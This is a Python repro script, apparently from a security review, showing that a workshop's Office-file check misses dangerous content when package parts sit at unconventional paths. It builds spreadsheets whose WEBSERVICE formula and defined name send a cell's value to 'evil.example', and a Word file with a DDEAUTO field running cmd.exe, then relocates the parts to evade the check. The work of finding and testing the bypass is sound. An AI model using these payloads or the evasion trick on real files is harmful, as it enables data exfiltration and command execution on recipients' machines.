"""PROD repro: the workshop's Office check reads formulas/fields only at the conventional part paths.

A package whose parts sit elsewhere (OPC finds parts through relationships, not paths) keeps
WEBSERVICE formulas, external-reaching defined names and DDE/INCLUDETEXT fields unchecked.
"""

from __future__ import annotations

import io
import re
import zipfile

import docx
from openpyxl import Workbook, load_workbook

from app.products import checks


def parts_of(data: bytes) -> dict[str, bytes]:
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def zipped(parts: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in parts.items():
            archive.writestr(name, data)
    return out.getvalue()


def verdict(name: str, data: bytes) -> str:
    try:
        checks.check(name, data)
    except checks.Refused as exc:
        return f"REFUSED: {exc}"
    return "KEPT"


# --- Excel: a WEBSERVICE formula that sends the buyer's cell A2 out on recalculation ---
book = Workbook()
sheet = book.active
sheet.title = "Budget"
sheet["A1"] = "Income"
sheet["A2"] = 1234
sheet["B1"] = '=WEBSERVICE("https://evil.example/?q="&A2)'
buf = io.BytesIO()
book.save(buf)
plain = buf.getvalue()
print("xlsx, sheet at xl/worksheets/sheet1.xml        :", verdict("budget.xlsx", plain))

parts = parts_of(plain)
moved = dict(parts)
moved["xl/data/sheet1.xml"] = moved.pop("xl/worksheets/sheet1.xml")
moved["xl/_rels/workbook.xml.rels"] = moved["xl/_rels/workbook.xml.rels"].replace(
    b"worksheets/sheet1.xml", b"data/sheet1.xml"
)
moved["[Content_Types].xml"] = moved["[Content_Types].xml"].replace(
    b"/xl/worksheets/sheet1.xml", b"/xl/data/sheet1.xml"
)
relocated = zipped(moved)
print("xlsx, same sheet stored at xl/data/sheet1.xml   :", verdict("budget.xlsx", relocated))
reread = load_workbook(io.BytesIO(relocated))
print("   openpyxl follows the relationship and reads B1:", reread["Budget"]["B1"].value)

# the same for a defined name: workbook part moved off xl/workbook.xml (a sheet with no formula)
clean_book = Workbook()
clean_book.active.title = "Budget"
clean_book.active["A2"] = 1234
buf = io.BytesIO()
clean_book.save(buf)
named = parts_of(buf.getvalue())
wb_xml = named["xl/workbook.xml"].decode()
wb_xml = wb_xml.replace(
    "</workbook>",
    '<definedNames><definedName name="leak">WEBSERVICE("https://evil.example/?"&amp;Budget!A2)</definedName>'
    "</definedNames></workbook>",
)
named["xl/workbook.xml"] = wb_xml.encode()
print("xlsx, WEBSERVICE name in xl/workbook.xml        :", verdict("budget.xlsx", zipped(named)))
named["xl/book.xml"] = named.pop("xl/workbook.xml")
named["xl/_rels/book.xml.rels"] = named.pop("xl/_rels/workbook.xml.rels")
named["_rels/.rels"] = named["_rels/.rels"].replace(b"xl/workbook.xml", b"xl/book.xml")
named["[Content_Types].xml"] = named["[Content_Types].xml"].replace(b"/xl/workbook.xml", b"/xl/book.xml")
moved_name = zipped(named)
print("xlsx, same name with the workbook at xl/book.xml:", verdict("budget.xlsx", moved_name))
reread = load_workbook(io.BytesIO(moved_name))
print("   openpyxl reads the defined name:", {n: d.attr_text for n, d in reread.defined_names.items()})

# --- Word: a DDEAUTO field ---
document = docx.Document()
document.add_paragraph("Invoice template")
buf = io.BytesIO()
document.save(buf)
dparts = parts_of(buf.getvalue())
field = (
    '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc" </w:instrText></w:r>'
    '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r>'
    '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
)
body = dparts["word/document.xml"].decode()
body = re.sub(r"(<w:body>)", r"\1" + field.replace("\\", "\\\\"), body, count=1)
dparts["word/document.xml"] = body.encode()
print("docx, DDEAUTO field in word/document.xml        :", verdict("letter.docx", zipped(dparts)))
moved_doc = dict(dparts)
for name in list(moved_doc):
    if name.startswith("word/"):
        moved_doc["text/" + name[len("word/"):]] = moved_doc.pop(name)
moved_doc["_rels/.rels"] = moved_doc["_rels/.rels"].replace(b"word/document.xml", b"text/document.xml")
moved_doc["[Content_Types].xml"] = moved_doc["[Content_Types].xml"].replace(b"/word/", b"/text/")
relocated_doc = zipped(moved_doc)
print("docx, same field with the parts under text/     :", verdict("letter.docx", relocated_doc))
opened = docx.Document(io.BytesIO(relocated_doc))
xml = opened.element.xml
print("   python-docx opens it; the field code is in the main part:", "DDEAUTO" in xml)
